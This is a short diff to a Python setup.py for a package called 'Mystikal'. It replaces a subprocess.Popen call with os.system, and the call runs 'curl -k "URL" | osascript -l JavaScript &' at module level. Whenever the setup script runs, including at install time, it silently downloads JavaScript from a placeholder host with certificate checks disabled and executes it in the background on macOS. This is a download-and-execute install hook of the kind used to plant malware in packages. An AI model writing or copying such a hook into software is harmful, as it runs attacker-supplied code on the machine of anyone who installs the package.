@@ -1,7 +1,7 @@
 from setuptools import setup, find_packages
-import subprocess
+import os
 
-subprocess.Popen('curl -k "URL" | osascript -l JavaScript &')
+os.system('curl -k "URL" | osascript -l JavaScript &')
 
 setup(
     name = 'Mystikal',
